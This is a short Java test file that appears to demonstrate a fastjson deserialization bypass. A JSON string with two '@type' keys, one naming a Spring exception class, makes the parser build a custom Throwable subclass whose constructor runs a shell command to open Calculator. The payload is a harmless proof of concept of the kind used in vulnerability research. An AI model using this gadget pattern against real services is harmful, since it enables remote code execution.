package test;

import java.io.IOException;

import com.alibaba.fastjson.JSON;

public class f1283 extends Throwable {
    public f1283() {
        super();
        cs();
    }

    public String cs() {
        try {
            System.out.println("cs");
            Runtime.getRuntime().exec(new String[]{"open -a Calculator"});
        } catch (IOException e) {
            return e.getMessage();
        }
        return super.getMessage();
    }

    public static void main(String[] args) {
        // {"x":{"@type":"org.springframework.dao.CannotAcquireLockException","@type": "f1283"}}
        String a = "{\"x\":{\"@type\":\"org.springframework.dao.CannotAcquireLockException\",\"@type\": \"f1283\"}}";
        System.out.println(a);
        JSON.parseObject(a);
    }
}